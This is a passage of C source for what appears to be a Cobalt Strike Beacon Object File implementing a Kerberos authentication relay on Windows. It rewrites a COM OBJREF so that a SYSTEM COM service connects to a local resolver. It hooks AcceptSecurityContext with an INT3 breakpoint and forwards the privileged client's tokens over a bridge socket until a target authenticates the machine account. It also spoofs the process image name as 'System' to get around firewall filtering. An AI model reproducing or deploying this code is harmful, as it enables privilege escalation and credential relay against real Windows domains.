    IStorage *storage, LPCOLESTR old_name, LPCOLESTR new_name) {
    (void)storage;
    (void)old_name;
    (void)new_name;
    return S_OK;
}

static HRESULT STDMETHODCALLTYPE tr_SetElementTimes(
    IStorage *storage, LPCOLESTR name, const FILETIME *created,
    const FILETIME *accessed, const FILETIME *modified) {
    (void)storage;
    (void)name;
    (void)created;
    (void)accessed;
    (void)modified;
    return S_OK;
}

static HRESULT STDMETHODCALLTYPE tr_SetClass(
    IStorage *storage, REFCLSID class_id) {
    (void)storage;
    (void)class_id;
    return S_OK;
}

static HRESULT STDMETHODCALLTYPE tr_SetStateBits(
    IStorage *storage, DWORD state_bits, DWORD mask) {
    (void)storage;
    (void)state_bits;
    (void)mask;
    return S_OK;
}

static HRESULT STDMETHODCALLTYPE marshal_qi(
    IMarshal *marshal, REFIID interface_id, void **result) {
    return trigger_qi((IStorage *)marshal, interface_id, result);
}

static ULONG STDMETHODCALLTYPE marshal_add(IMarshal *marshal) {
    return trigger_add((IStorage *)marshal);
}

static ULONG STDMETHODCALLTYPE marshal_release(IMarshal *marshal) {
    return trigger_release((IStorage *)marshal);
}

static HRESULT STDMETHODCALLTYPE marshal_class(
    IMarshal *marshal, REFIID interface_id, void *object, DWORD context,
    void *context_data, DWORD flags, CLSID *unmarshal_class) {
    /* The remote COM server must consume our rewritten bytes as a standard OBJREF. */
    static const CLSID standard_marshaler = {
        0x00000306, 0, 0, {0xc0, 0, 0, 0, 0, 0, 0, 0x46}
    };
    (void)marshal;
    (void)interface_id;
    (void)object;
    (void)context;
    (void)context_data;
    (void)flags;
    g_state.trace |= TRACE_MARSHAL_CLASS;
    *unmarshal_class = standard_marshaler;
    return S_OK;
}

static HRESULT STDMETHODCALLTYPE marshal_size(
    IMarshal *marshal, REFIID interface_id, void *object, DWORD context,
    void *context_data, DWORD flags, DWORD *maximum_size) {
    (void)marshal;
    (void)interface_id;
    (void)object;
    (void)context;
    (void)context_data;
    (void)flags;
    /* The rewritten OBJREF is always below this tested stream-size estimate. */
    *maximum_size = 1024;
    return S_OK;
}

static HRESULT STDMETHODCALLTYPE marshal_iface(
    IMarshal *marshal, IStream *stream, REFIID interface_id, void *object,
    DWORD context, void *context_data, DWORD flags) {
    TRIGGER *trigger = trigger_from(marshal);
    ULONG bytes_written = 0;
    (void)interface_id;
    (void)object;
    (void)context;
    (void)context_data;
    (void)flags;
    g_state.trace |= TRACE_MARSHAL_WRITE;
    return stream->lpVtbl->Write(
        stream, trigger->objref, trigger->objref_len, &bytes_written);
}

static HRESULT STDMETHODCALLTYPE marshal_unmarshal(
    IMarshal *marshal, IStream *stream, REFIID interface_id, void **result) {
    (void)marshal;
    (void)stream;
    (void)interface_id;
    /* This facade marshals outbound only; it never creates a local proxy. */
    *result = NULL;
    return E_NOTIMPL;
}

static HRESULT STDMETHODCALLTYPE marshal_release_data(
    IMarshal *marshal, IStream *stream) {
    (void)marshal;
    (void)stream;
    /* g_state owns the OBJREF, so COM has no separate packet allocation to free. */
    return S_OK;
}

static HRESULT STDMETHODCALLTYPE marshal_disconnect(
    IMarshal *marshal, DWORD reserved) {
    (void)marshal;
    (void)reserved;
    /* No custom channel remains connected after MarshalInterface returns. */
    return S_OK;
}

static IStorageVtbl storage_vtbl={(void*)1};
static IMarshalVtbl marshal_vtbl={(void*)1};

static void prepare_interfaces(void) {
    /* Construct callback tables after Cobalt places the COFF at its final
       address, avoiding loader-specific IMAGE_REL_AMD64_ADDR64 support. */
    storage_vtbl.QueryInterface = (void *)trigger_qi;
    storage_vtbl.AddRef = (void *)trigger_add;
    storage_vtbl.Release = (void *)trigger_release;
    storage_vtbl.CreateStream = tr_CreateStream;
    storage_vtbl.OpenStream = tr_OpenStream;
    storage_vtbl.CreateStorage = tr_CreateStorage;
    storage_vtbl.OpenStorage = tr_OpenStorage;
    storage_vtbl.CopyTo = tr_CopyTo;
    storage_vtbl.MoveElementTo = tr_MoveElementTo;
    storage_vtbl.Commit = tr_Commit;
    storage_vtbl.Revert = tr_Revert;
    storage_vtbl.EnumElements = tr_EnumElements;
    storage_vtbl.DestroyElement = tr_DestroyElement;
    storage_vtbl.RenameElement = tr_RenameElement;
    storage_vtbl.SetElementTimes = tr_SetElementTimes;
    storage_vtbl.SetClass = tr_SetClass;
    storage_vtbl.SetStateBits = tr_SetStateBits;
    storage_vtbl.Stat = tr_Stat;

    marshal_vtbl.QueryInterface = (void *)marshal_qi;
    marshal_vtbl.AddRef = (void *)marshal_add;
    marshal_vtbl.Release = (void *)marshal_release;
    marshal_vtbl.GetUnmarshalClass = marshal_class;
    marshal_vtbl.GetMarshalSizeMax = marshal_size;
    marshal_vtbl.MarshalInterface = marshal_iface;
    marshal_vtbl.UnmarshalInterface = marshal_unmarshal;
    marshal_vtbl.ReleaseMarshalData = marshal_release_data;
    marshal_vtbl.DisconnectObject = marshal_disconnect;

    kzero(&resolver_interface, sizeof(resolver_interface));
    resolver_interface.Length = sizeof(resolver_interface);
    resolver_interface.InterfaceId = resolver_syntax;
    resolver_interface.TransferSyntax = ndr_syntax;
}

/* Obtain a valid standard OBJREF from COM rather than fabricating its identity
 * fields. CoMarshalInterface registers a fresh OXID/OID/IPID with RPCSS and
 * writes the packet to a seekable stream. The stream remains owned by
 * g_state.anchor_stream until CoReleaseMarshalData during ordered cleanup. */
static int marshal_native_anchor(IUnknown *anchor, BYTE **objref, ULONG *objref_len) {
    IStream *stream = NULL;
    STATSTG stat;
    LARGE_INTEGER zero;
    ULONG bytes_read = 0;
    HRESULT hr;
    int marshal_registered = 0;

    zero.QuadPart = 0;
    kzero(&stat, sizeof(stat));

    g_state.stage = STAGE_MARSHAL_STREAM;
    hr = OLE32$CreateStreamOnHGlobal(NULL, TRUE, &stream);
    /* A seekable native stream is required to create and later revoke the OBJREF. */
    if (FAILED(hr) || !stream) {
        goto failed;
    }

    g_state.stage = STAGE_MARSHAL_INTERFACE;
    hr = OLE32$CoMarshalInterface(stream, &KIID_IUnknown, anchor,
                                  MSHCTX_DIFFERENTMACHINE, NULL,
                                  MSHLFLAGS_NORMAL);
    /* Without a successful registration, CoReleaseMarshalData is not legal. */
    if (FAILED(hr)) {
        goto failed;
    }
    marshal_registered = 1;

    g_state.stage = STAGE_MARSHAL_READ;
    hr = stream->lpVtbl->Stat(stream, &stat, STATFLAG_NONAME);
    /* This parser uses a 32-bit packet size; 68 bytes is the smallest OBJREF_STANDARD. */
    if (FAILED(hr) || stat.cbSize.HighPart || stat.cbSize.LowPart < 68) {
        goto failed;
    }

    *objref_len = stat.cbSize.LowPart;
    *objref = (BYTE *)alloc(*objref_len);
    if (!*objref) {
        hr = E_OUTOFMEMORY;
        goto failed;
    }

    stream->lpVtbl->Seek(stream, zero, STREAM_SEEK_SET, NULL);
    hr = stream->lpVtbl->Read(stream, *objref, *objref_len, &bytes_read);
    /* A partial packet cannot safely supply OXID/OID/IPID or binding offsets. */
    if (FAILED(hr) || bytes_read != *objref_len) {
        goto failed;
    }

    g_state.anchor_stream = stream;
    return 1;

failed:
    g_state.detail = (int)hr;
    release(*objref);
    *objref = NULL;
    *objref_len = 0;
    if (stream) {
        if (marshal_registered) {
            stream->lpVtbl->Seek(stream, zero, STREAM_SEEK_SET, NULL);
            OLE32$CoReleaseMarshalData(stream);
        }
        IStream_Release(stream);
    }
    return 0;
}

/* Replace only the standard OBJREF's DUALSTRINGARRAY. The first tower points
 * to this task's local TCP resolver. On a reused COM process, the second tower
 * is synthesized from the current SPN because process security is immutable;
 * on first use, COM's freshly registered Negotiate binding is copied intact. */
static int build_objref(IUnknown *anchor, TRIGGER *trigger) {
    BYTE *original = NULL;
    BYTE *original_security = NULL;
    BYTE *cursor;
    ULONG original_len = 0;
    ULONG address_chars = 0;
    ULONG address_words;
    ULONG binding_words;
    ULONG security_words;
    ULONG total_words;
    ULONG spn_chars = 0;
    ULONG i;

    if (!marshal_native_anchor(anchor, &original, &original_len)) {
        return 0;
    }
    /* Verify both the fixed standard-OBJREF extent and its little-endian MEOW tag. */
    if (original_len < 68 || rd16(original) != 0x454d) {
        release(original);
        return 0;
    }

    while (g_state.rpc_host[address_chars]) {
        address_chars++;
    }
    address_words = address_chars + 1; /* includes the UTF-16 NUL */
    binding_words = 1 + address_words + 1; /* tower ID + address + terminator */

    g_state.stage = STAGE_OBJREF_BINDING;
    /* The security offset must fall within the original DUALSTRINGARRAY. */
    if (rd16(original + 66) > rd16(original + 64)) {
        release(original);
        return 0;
    }

    if (g_state.rewrite_security_binding) {
        while (g_state.service_spn[spn_chars]) {
            spn_chars++;
        }
        security_words = spn_chars + 4; /* authn, authz, SPN NUL, list NUL */
    } else {
        security_words = rd16(original + 64) - rd16(original + 66);
        original_security = original + 68 + rd16(original + 66) * 2;
        /* Keep only a nonempty binding from a supported Kerberos package. */
        if (!security_words ||
            (rd16(original_security) != RPC_C_AUTHN_GSS_NEGOTIATE &&
             rd16(original_security) != RPC_C_AUTHN_GSS_KERBEROS)) {
            g_state.stage = STAGE_OBJREF_SECURITY;
            release(original);
            return 0;
        }
    }

    total_words = binding_words + security_words;
    trigger->objref_len = 68 + total_words * 2;
    trigger->objref = (BYTE *)alloc(trigger->objref_len);
    if (!trigger->objref) {
        release(original);
        return 0;
    }

    /* Preserve the validated MEOW/STDOBJREF identity through byte 63. */
    cursor = trigger->objref;
    kcopy(cursor, original, 64);
    cursor += 64;

    wr16(cursor, (WORD)total_words);
    wr16(cursor + 2, (WORD)binding_words);
    cursor += 4;

    wr16(cursor, 7); /* ncacn_ip_tcp */
    cursor += 2;
    for (i = 0; i < address_words; i++) {
        wr16(cursor, g_state.rpc_host[i]);
        cursor += 2;
    }
    wr16(cursor, 0);
    cursor += 2;

    if (g_state.rewrite_security_binding) {
        wr16(cursor, RPC_C_AUTHN_GSS_NEGOTIATE);
        wr16(cursor + 2, 0xffff); /* default authorization service */
        cursor += 4;
        for (i = 0; i <= spn_chars; i++) {
            wr16(cursor, g_state.service_spn[i]);
            cursor += 2;
        }
        wr16(cursor, 0);
    } else {
        kcopy(cursor, original_security, security_words * 2);
    }

    release(original);
    return 1;
}

/* -------------------------------------------------------------------------
 * SSPI token parsing and relay interception
 * ------------------------------------------------------------------------- */
static int extract_rpc(PSecBufferDesc input, BYTE **rpc, ULONG *rpc_len) {
    /* One RPC PDU can span several SECBUFFER_DATA entries. Flatten it before
       using frag_length/auth_length to locate the authentication trailer. */
    ULONG i;
    ULONG total = 0;
    ULONG offset = 0;
    BYTE *flattened;

    /* A descriptor without buffers cannot contain an RPC packet. */
    if (!input || !input->pBuffers || !input->cBuffers) {
        return 0;
    }
    for (i = 0; i < input->cBuffers; i++) {
        /* MAX_TOKEN prevents both unsigned addition overflow and bridge oversize. */
        if (input->pBuffers[i].cbBuffer > MAX_TOKEN - total) {
            return 0;
        }
        total += input->pBuffers[i].cbBuffer;
    }
    /* DCE/RPC requires 16 bytes before frag_length/auth_length are readable. */
    if (total < 16) {
        return 0;
    }
    flattened = (BYTE *)alloc(total);
    if (!flattened) {
        return 0;
    }
    for (i = 0; i < input->cBuffers; i++) {
        kcopy(flattened + offset, input->pBuffers[i].pvBuffer,
              input->pBuffers[i].cbBuffer);
        offset += input->pBuffers[i].cbBuffer;
    }
    *rpc = flattened;
    *rpc_len = total;
    return 1;
}

static SecBuffer *output_auth_buffer(
    PSecBufferDesc output, ULONG *index_out) {
    /* Locate the runtime TOKEN slot. Its position differs across Windows/RPCSS
       contexts, which is why the inherited fixed +116 offset was unreliable. */
    ULONG i;
    if (index_out) {
        *index_out = 0;
    }
    /* AcceptSecurityContext must expose at least one writable TOKEN buffer. */
    if (!output || !output->pBuffers || !output->cBuffers) {
        return NULL;
    }
    for (i = 0; i < output->cBuffers; i++) {
        if ((output->pBuffers[i].BufferType & 0xffff) == SECBUFFER_TOKEN &&
            output->pBuffers[i].pvBuffer) {
            if (index_out) {
                *index_out = i;
            }
            return &output->pBuffers[i];
        }
    }
    return NULL;
}

static int write_accept_entry(BYTE value) {
    DWORD old_protect = 0, restored = 0;
    volatile BYTE *entry = (volatile BYTE *)g_state.original_accept;

    /* Never write resident code unless VirtualProtect made the byte writable. */
    if (!entry ||
        !KERNEL32$VirtualProtect((LPVOID)entry, 1, PAGE_EXECUTE_READWRITE,
                                 &old_protect)) {
        return 0;
    }
    *entry = value;
    KERNEL32$FlushInstructionCache(KERNEL32$GetCurrentProcess(),
                                   (LPCVOID)entry, 1);
    KERNEL32$VirtualProtect((LPVOID)entry, 1, old_protect, &restored);
    return 1;
}

static SECURITY_STATUS call_original_accept(
    PCredHandle credential, PCtxtHandle context, PSecBufferDesc input,
    ULONG request_flags, ULONG data_representation, PCtxtHandle new_context,
    PSecBufferDesc output, PULONG attributes, PTimeStamp expiry) {
    SECURITY_STATUS status;

    /* Restore the native byte around the call to avoid recursively trapping
     * this helper, then re-arm immediately for the next RPC auth leg. */
    if (g_state.breakpoint_installed &&
        !write_accept_entry(g_state.accept_saved_byte)) {
        return SEC_E_INTERNAL_ERROR;
    }
    status = g_state.original_accept(
        credential, context, input, request_flags, data_representation,
        new_context, output, attributes, expiry);
    /* Losing the breakpoint after the first leg invalidates relay state. */
    if (g_state.breakpoint_installed && !write_accept_entry(0xcc)) {
        g_state.bridge_failed = 1;
    }
    return status;
}

static SECURITY_STATUS SEC_ENTRY accept_hook(
    PCredHandle cred, PCtxtHandle context, PSecBufferDesc input, ULONG req,
    ULONG rep, PCtxtHandle newctx, PSecBufferDesc output, PULONG attrs,
    PTimeStamp expiry) {
    /*
     * For each DCE/RPC leg, relay the opaque auth_value. Run the real
     * acceptor with isolated output to advance RPCSS state, then place the
     * target continuation in RPCSS's actual TOKEN buffer and set its true length.
     * The privileged client consequently consumes the AP-REP and emits the
     * next SPNEGO leg without the BOF needing Kerberos keys or ASN.1 mutation.
     */
    BYTE *rpc = NULL;
    BYTE *reply = NULL;
    BYTE *output_target = NULL;
    ULONG rpc_len = 0;
    ULONG reply_len = 0;
    ULONG auth_len = 0;
    ULONG frag_len = 0;
    ULONG token_offset = 0;
    ULONG i;
    BYTE message_type = 0;
    BYTE auth_type = 0;
    int relay_rpc = 0;
    SecBuffer temporary_buffer;
    SecBufferDesc temporary_output;
    SecBuffer *runtime_output = NULL;
    SECURITY_STATUS status;

    atomic_add(&g_state.active_callbacks, 1);

    /* Once Python owns an authenticated target connection, later unrelated SSPI
     * calls in the process must use the native implementation untouched. */
    if (g_state.success) {
        status = call_original_accept(cred, context, input, req, rep, newctx,
                                      output, attrs, expiry);
        goto accept_return;
    }

    if (extract_rpc(input, &rpc, &rpc_len)) {
        frag_len = rd16(rpc + 8);
        auth_len = rd16(rpc + 10);

        /* auth_length counts only auth_value. The eight-byte sec_trailer just
         * before it supplies auth_type. Require a complete little-endian PDU. */
        if (rpc[0] == 5 && (rpc[4] & 0xf0) == 0x10 && auth_len &&
            frag_len <= rpc_len && frag_len >= 8 && auth_len <= frag_len - 8) {
            token_offset = frag_len - auth_len;
            auth_type = rpc[token_offset - 8];
            relay_rpc = auth_type == RPC_C_AUTHN_GSS_NEGOTIATE ||
                        auth_type == RPC_C_AUTHN_GSS_KERBEROS;
        }

        /* Ownership of reply moves to g_state.continuation only for a target
         * continuation. Otherwise it remains a local allocation. */
        if (relay_rpc) {
            int exchange_complete =
                bridge_connect() &&
                send_record(BRIDGE_CLIENT_TOKEN, rpc + token_offset, auth_len) &&
                recv_auth_reply(&message_type, &reply, &reply_len);

            /* A bridge-supplied error is already specific; avoid a second generic one. */
            if (!exchange_complete && !g_state.bridge_failed) {
                g_state.bridge_failed = 1;
                g_state.stage = STAGE_RELAY_BRIDGE;
                BeaconPrintf(CALLBACK_ERROR,
                             "[-] Relay transport failed on authentication "
                             "leg %d\n", g_state.callback_count + 1);
            }
            if (exchange_complete) {
                if (message_type == BRIDGE_SERVER_TOKEN && reply_len) {
                    /* A server token completed this relay leg and advances SPNEGO. */
                    g_state.relayed_leg_count++;
                    BeaconPrintf(CALLBACK_OUTPUT,
                                 "[*] Relayed authentication leg %d\n",
                                 g_state.relayed_leg_count);
                    g_state.trace |= TRACE_RELAY_CONTINUATION;
                    release(g_state.continuation);
                    g_state.continuation = reply;
                    g_state.continuation_len = reply_len;
                    reply = NULL;
                } else if (message_type == BRIDGE_AUTH_OK) {
                    /* AUTH_OK confirms that the target accepted the client identity. */
                    g_state.relayed_leg_count++;
                    BeaconPrintf(CALLBACK_OUTPUT,
                                 "[*] Relayed authentication leg %d\n",
                                 g_state.relayed_leg_count);
                    g_state.success = 1;
                    BeaconPrintf(
                        CALLBACK_OUTPUT,
                        "[+] Relay target authenticated the machine account\n");
                } else if (message_type == BRIDGE_ERROR) {
                    /* An explicit adapter failure is terminal and is not a relayed leg. */
                    g_state.stage = STAGE_RELAY_TARGET;
                    report_bridge_error(reply, reply_len);
                }
            }
        }
    }
    release(rpc);
    release(reply);

    /* Malformed or non-Kerberos SSPI traffic is unrelated to this relay. */
    if (!relay_rpc) {
        status = call_original_accept(cred, context, input, req, rep, newctx,
                                      output, attrs, expiry);
        goto accept_return;
    }

    /* Advance the native RPCSS security context, but isolate its local token
     * output. Only the opaque target response is published to the privileged
     * COM client through RPCSS's real runtime-selected TOKEN buffer. */
    temporary_buffer.BufferType = SECBUFFER_TOKEN;
    temporary_buffer.cbBuffer = 12288;
    temporary_buffer.pvBuffer = alloc(temporary_buffer.cbBuffer);
    if (!temporary_buffer.pvBuffer) {
        status = SEC_E_INSUFFICIENT_MEMORY;
        goto accept_done;
    }
    temporary_output.ulVersion = SECBUFFER_VERSION;
    temporary_output.cBuffers = 1;
    temporary_output.pBuffers = &temporary_buffer;
    status = call_original_accept(cred, context, input, req, rep, newctx,
                                  &temporary_output, attrs, expiry);
    release(temporary_buffer.pvBuffer);

    /* The target is already authenticated. Tear down this local RPC association so
       COM cannot retain and reuse its deliberately mismatched security state. */
    if (g_state.success) {
        if (output && output->pBuffers) {
            for (i = 0; i < output->cBuffers; i++) {
                /* Clear every TOKEN slot before RPCSS transmits the denied reply. */
                if ((output->pBuffers[i].BufferType & 0xffff) ==
                    SECBUFFER_TOKEN) {
                    output->pBuffers[i].cbBuffer = 0;
                }
            }
        }
        status = SEC_E_LOGON_DENIED;
        goto accept_done;
    }

    if (g_state.continuation && output && output->cBuffers) {
        runtime_output = output_auth_buffer(output, NULL);
        if (runtime_output) {
            output_target = (BYTE *)runtime_output->pvBuffer;
        }
        if (!runtime_output || !output_target) {
            const BYTE message[] = "RPCSS exposed no writable token buffer";
            g_state.bridge_failed = 1;
            g_state.stage = STAGE_RELAY_CONTINUATION;
            send_record(BRIDGE_ERROR, message, sizeof(message) - 1);
            BeaconPrintf(CALLBACK_ERROR,
                         "[-] RPCSS authentication response was unavailable\n");
            status = SEC_E_BUFFER_TOO_SMALL;
            goto accept_done;
        }
        if (g_state.continuation_len > runtime_output->cbBuffer) {
            const BYTE message[] = "relay continuation exceeds RPCSS token buffer";
            g_state.bridge_failed = 1;
            g_state.stage = STAGE_RELAY_CONTINUATION;
            send_record(BRIDGE_ERROR, message, sizeof(message) - 1);
            BeaconPrintf(CALLBACK_ERROR,
                         "[-] Relay continuation exceeds RPCSS "
                         "capacity (%lu > %lu)\n",
                         g_state.continuation_len, runtime_output->cbBuffer);
            status = SEC_E_BUFFER_TOO_SMALL;
            goto accept_done;
        }

        g_state.trace |= TRACE_CONTINUATION_INJECTED;
        kcopy(output_target, g_state.continuation, g_state.continuation_len);
        runtime_output->cbBuffer = g_state.continuation_len;
        BeaconPrintf(CALLBACK_OUTPUT,
                     "[*] Applied relay continuation to authentication leg %d\n",
                     g_state.relayed_leg_count);
    }
accept_done:
    release(g_state.continuation);
    g_state.continuation = NULL;
    g_state.continuation_len = 0;
    g_state.callback_count++;
accept_return:
    atomic_add(&g_state.active_callbacks, -1);
    return status;
}

static int install_hook(void) {
    PSecurityFunctionTableW table;

    /* Breakpoint the resident native entry rather than replacing a function
       pointer that immutable COM security can retain after this BOF unloads. */
    table = SECUR32$InitSecurityInterfaceW();
    /* Missing the native SSPI table leaves no safe function to intercept. */
    if (!table) {
        return 0;
    }
    g_state.original_accept = table->AcceptSecurityContext;
    g_state.accept_saved_byte = *(BYTE *)g_state.original_accept;
    /* INT3 already present means this process entry is owned by another hook. */
    if (g_state.accept_saved_byte == 0xcc) {
        return 0;
    }

    /* Mark installed before publishing INT3: another RPC thread can execute
     * the entry as soon as the instruction cache is flushed. */
    g_state.breakpoint_installed = 1;
    if (!write_accept_entry(0xcc)) {
        g_state.breakpoint_installed = 0;
        return 0;
    }
    return 1;
}

static void remove_hook(void) {
    /* Idempotence allows cleanup after any partially completed startup path. */
    if (!g_state.breakpoint_installed) {
        return;
    }
    write_accept_entry(g_state.accept_saved_byte);
    g_state.breakpoint_installed = 0;
}

static KUNICODE_STRING *patch_firewall_name(BYTE saved[14]) {
    /* RPCSS filters returned TCP bindings using the registered image name.
       Present "System" only while COM security registers the endpoint, then
       restore the original seven UTF-16 code units immediately. */
    KPROCESS_BASIC_INFORMATION process_info;
    ULONG returned = 0;
    void *parameters;
    KUNICODE_STRING *image_name;
    const BYTE system_name[14] = {
        'S', 0, 'y', 0, 's', 0, 't', 0, 'e', 0, 'm', 0, 0, 0
    };

    kzero(&process_info, sizeof(process_info));
    /* NtQueryInformationProcess provides this process's authoritative PEB. */
    if (NTDLL$NtQueryInformationProcess(
            KERNEL32$GetCurrentProcess(), 0, &process_info,
            sizeof(process_info), &returned) < 0 ||
        !process_info.PebBaseAddress) {
        return NULL;
    }

    /* PEB+0x20 is ProcessParameters on the supported x64 Windows layout. */
    parameters = *(void **)((BYTE *)process_info.PebBaseAddress + 0x20);
    if (!parameters) {
        return NULL;
    }

    /* Parameters+0x60 is ImagePathName; 14 bytes cover "System" and its NUL. */
    image_name = (KUNICODE_STRING *)((BYTE *)parameters + 0x60);
    if (!image_name->Buffer || image_name->MaximumLength < 14) {
        return NULL;
    }

    /* The KUNICODE_STRING is borrowed and valid only while ProcessParameters lives. */
    kcopy(saved, image_name->Buffer, 14);
    kcopy(image_name->Buffer, system_name, 14);
    return image_name;
}

static void wait_callback_quiescence(void);

/* -------------------------------------------------------------------------
 * One COM activation
 *
 * A native stream supplies a valid standard-marshaled anchor. The custom
 * IStorage/IMarshal object then substitutes our rewritten OBJREF when the
 * selected SYSTEM COM class unmarshals the activation's storage argument.
 * ------------------------------------------------------------------------- */
static void release_marshaled_anchor(void) {
    LARGE_INTEGER zero;

    /* Partial initialization may leave no marshal packet to revoke. */
    if (!g_state.anchor_stream) {
        return;
    }
    zero.QuadPart = 0;

    /* CoMarshalInterface created an OLE marshal-table entry. Releasing only
     * the stream would leave that process-wide entry alive, so revoke it while
     * this BOF and all of its callback code are still mapped. */
    g_state.anchor_stream->lpVtbl->Seek(g_state.anchor_stream, zero,
                                         STREAM_SEEK_SET, NULL);
    OLE32$CoReleaseMarshalData(g_state.anchor_stream);
    IStream_Release(g_state.anchor_stream);
    g_state.anchor_stream = NULL;
}

static int activation_once(CLSID *clsid) {
    ILockBytes *lock_bytes = NULL;
    IStorage *storage = NULL;
    IStream *native_anchor = NULL;
    TRIGGER *trigger = &g_state.trigger;
    MULTI_QI result;
    HRESULT hr = E_FAIL;
    int relay_succeeded = 0;

    release(g_state.continuation);
    g_state.continuation = NULL;
    g_state.continuation_len = 0;
    if (g_state.bridge != INVALID_SOCKET) {
        WS2_32$closesocket(g_state.bridge);
        g_state.bridge = INVALID_SOCKET;
    }
    g_state.success = 0;
    g_state.bridge_failed = 0;
    g_state.callback_count = 0;
    g_state.relayed_leg_count = 0;
    g_state.trace = 0;
    g_state.detail = 0;

    /* The anchor is a native COM object, not callback code inside this COFF.
     * RPCSS may retain its standard identity while the activation is active. */
    g_state.stage = STAGE_NATIVE_ANCHOR;
    hr = OLE32$CreateStreamOnHGlobal(NULL, TRUE, &native_anchor);
    if (FAILED(hr) || !native_anchor) {
        g_state.detail = (int)hr;
        goto done;
    }

    trigger->storageVtbl = &storage_vtbl;
    trigger->marshalVtbl = &marshal_vtbl;
    trigger->refs = 1; /* loader-owned object: COM Release never frees it */

    g_state.stage = STAGE_OBJREF_PREPARE;
    /* A validated OBJREF is mandatory before the custom marshaler is exposed. */
    if (!build_objref((IUnknown *)native_anchor, trigger)) {
        goto done;
    }

    g_state.stage = STAGE_STORAGE;
    hr = OLE32$CreateILockBytesOnHGlobal(NULL, TRUE, &lock_bytes);
    if (FAILED(hr) || !lock_bytes) {
        g_state.detail = (int)hr;
        goto done;
    }
    hr = OLE32$StgCreateDocfileOnILockBytes(
        lock_bytes, STGM_CREATE | STGM_READWRITE | STGM_SHARE_EXCLUSIVE,
        0, &storage);
    if (FAILED(hr) || !storage) {
        g_state.detail = (int)hr;
        goto done;
    }

    /* CoGetInstanceFromIStorage treats &storageVtbl as IStorage*. Its
     * QueryInterface then exposes &marshalVtbl as the same logical trigger. */
    trigger->backing = storage;
    kzero(&result, sizeof(result));
    result.pIID = &KIID_IUnknown;

    BeaconPrintf(CALLBACK_OUTPUT,
                 "[*] Triggering COM object: McpManagementService\n");
    g_state.stage = STAGE_ACTIVATION;
    hr = OLE32$CoGetInstanceFromIStorage(
        NULL, clsid, NULL, CLSCTX_LOCAL_SERVER,
        (IStorage *)&trigger->storageVtbl, 1, &result);
    g_state.detail = (int)hr;

    /* Activation may return an interface even when the outer HRESULT failed. */
    if (result.pItf) {
        IUnknown_Release(result.pItf);
    }
    wait_callback_quiescence();
    relay_succeeded = g_state.success;
done:
    /* Preserve this order: revoke the marshal table before releasing the
     * anchor and wait until activation callbacks stop before unloading code. */
    release_marshaled_anchor();
    release(trigger->objref);
    trigger->objref = NULL;
    trigger->objref_len = 0;
    /* Every check below supports cleanup after a partially built activation. */
    if (storage) {
        IStorage_Release(storage);
    }
    trigger->backing = NULL;
    if (lock_bytes) {
        ILockBytes_Release(lock_bytes);
    }
    if (native_anchor) {
        IStream_Release(native_anchor);
    }
    if (g_state.bridge != INVALID_SOCKET) {
        WS2_32$closesocket(g_state.bridge);
        g_state.bridge = INVALID_SOCKET;
    }
    return relay_succeeded;
}

/* -------------------------------------------------------------------------
 * Process COM security and task-owned resolver registration
 * ------------------------------------------------------------------------- */
static int process_supports_kerberos_authentication(
    SOLE_AUTHENTICATION_SERVICE *services, DWORD service_count) {
    DWORD i;
    for (i = 0; i < service_count; i++) {
        if (services[i].dwAuthnSvc == RPC_C_AUTHN_GSS_NEGOTIATE ||
            services[i].dwAuthnSvc == RPC_C_AUTHN_GSS_KERBEROS) {
            return 1;
        }
    }
    return 0;
}

static int initialize_worker_com(void) {
    SOLE_AUTHENTICATION_SERVICE *registered = NULL;
    SOLE_AUTHENTICATION_SERVICE *persistent_service = NULL;
    WCHAR *persistent_principal = NULL;
    KUNICODE_STRING *image_name = NULL;
    BYTE saved_image_name[14];
    DWORD registered_count = 0;
    ULONG principal_chars = 0;
    HRESULT hr;

    g_state.stage = STAGE_WORKER_COM;
    hr = OLE32$CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (FAILED(hr)) {
        g_state.detail = (int)hr;
        return 0;
    }
    g_state.com_ready = 1;
    g_state.com_thread_id = KERNEL32$GetCurrentThreadId();

    /* CoQueryAuthenticationServices succeeds only after process COM security
     * is fixed. If Kerberos/Negotiate is present, do not call
     * CoInitializeSecurity again: use a fresh OBJREF SecurityBinding instead. */
    g_state.stage = STAGE_COM_QUERY;
    hr = OLE32$CoQueryAuthenticationServices(&registered_count, &registered);
    if (SUCCEEDED(hr) && registered) {
        g_state.com_security_immutable =
            process_supports_kerberos_authentication(registered,
                                                       registered_count);
        OLE32$CoTaskMemFree(registered);
        if (!g_state.com_security_immutable) {
            g_state.stage = STAGE_COM_POLICY;
            g_state.detail = (int)registered_count;
            BeaconPrintf(CALLBACK_ERROR,
                         "[-] Existing COM policy has no Kerberos-capable "
                         "authentication service\n");
            return 0;
        }
        g_state.rewrite_security_binding = 1;
        BeaconPrintf(CALLBACK_OUTPUT,
                     "[+] Existing Kerberos-capable COM security accepted\n");
        return 1;
    }
    /* A failed query may still return a COM-allocated partial result. */
    if (registered) {
        OLE32$CoTaskMemFree(registered);
    }

    /* First use owns the one process-wide CoInitializeSecurity call. COM can
     * retain both structures after return, so successful allocations are
     * intentionally process-lifetime objects rather than BOF-lifetime data. */
    while (g_state.service_spn[principal_chars]) {
        principal_chars++;
    }
    persistent_service =
        (SOLE_AUTHENTICATION_SERVICE *)alloc(sizeof(*persistent_service));
    persistent_principal =
        (WCHAR *)alloc((principal_chars + 1) * sizeof(WCHAR));
    if (!persistent_service || !persistent_principal) {
        release(persistent_service);
        release(persistent_principal);
        g_state.detail = (int)E_OUTOFMEMORY;
        return 0;
    }
    kcopy(persistent_principal, g_state.service_spn,
          (principal_chars + 1) * sizeof(WCHAR));
    persistent_service->dwAuthnSvc = RPC_C_AUTHN_GSS_NEGOTIATE;
    persistent_service->pPrincipalName = persistent_principal;

    /* patch_firewall_name borrows the PEB image-name buffer. Restore those
     * seven UTF-16 code units immediately after the COM security call. */
    image_name = patch_firewall_name(saved_image_name);
    if (!image_name) {
        release(persistent_service);
        release(persistent_principal);
        return 0;
    }

    g_state.stage = STAGE_COM_SECURITY;
    hr = OLE32$CoInitializeSecurity(
        NULL, 1, persistent_service, NULL, RPC_C_AUTHN_LEVEL_DEFAULT,
        RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_DYNAMIC_CLOAKING, NULL);
    kcopy(image_name->Buffer, saved_image_name, sizeof(saved_image_name));

    /* RPC_E_TOO_LATE means a prior task fixed reusable process-wide COM policy. */
    if (hr == RPC_E_TOO_LATE) {
        release(persistent_service);
        release(persistent_principal);
        g_state.com_security_immutable = 1;
